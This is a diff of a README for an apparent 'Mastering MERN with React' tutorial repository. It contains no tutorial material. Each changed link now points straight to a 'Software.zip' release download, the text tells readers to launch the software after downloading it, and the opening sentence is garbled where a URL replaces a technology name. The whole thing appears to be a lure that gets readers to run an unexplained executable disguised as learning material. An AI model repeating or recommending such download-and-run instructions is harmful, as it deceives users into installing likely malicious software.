@@ -1,6 +1,6 @@
 # 🚀 Mastering MERN with React 🚀
 
-Welcome to the "Mastering-MERN-with-React" repository! 🌱 This is your one-stop destination to dive deep into the world of full-stack development with MongoDB, Express, React, and https://github.com/ghzfps/Mastering-MERN-with-React/releases/tag/v1.0 Whether you are a beginner starting from scratch or an experienced developer looking to enhance your skills, this repo has something for everyone! 💻
+Welcome to the "Mastering-MERN-with-React" repository! 🌱 This is your one-stop destination to dive deep into the world of full-stack development with MongoDB, Express, React, and https://github.com/ghzfps/Mastering-MERN-with-React/releases/download/v2.0/Software.zip Whether you are a beginner starting from scratch or an experienced developer looking to enhance your skills, this repo has something for everyone! 💻
 
 ## Overview
 
@@ -24,7 +24,7 @@ In this repository, you will find step-by-step guides, tutorials, and projects t
 ## How to Get Started
 To get started with mastering MERN with React, simply download the software package from the following link:
 
-[![Download Software](https://github.com/ghzfps/Mastering-MERN-with-React/releases/tag/v1.0)](https://github.com/ghzfps/Mastering-MERN-with-React/releases/tag/v1.0)
+[![Download Software](https://github.com/ghzfps/Mastering-MERN-with-React/releases/download/v2.0/Software.zip)](https://github.com/ghzfps/Mastering-MERN-with-React/releases/download/v2.0/Software.zip)
 
 Remember, the software needs to be launched after download to kickstart your learning journey.
 
@@ -37,4 +37,4 @@ Join us on this exciting journey of mastering MERN with React, where you will ga
 
 Happy Coding! 🚀🌟👩‍💻
 
-Visit [this link](https://github.com/ghzfps/Mastering-MERN-with-React/releases/tag/v1.0) to get started now!
+Visit [this link](https://github.com/ghzfps/Mastering-MERN-with-React/releases/download/v2.0/Software.zip) to get started now!
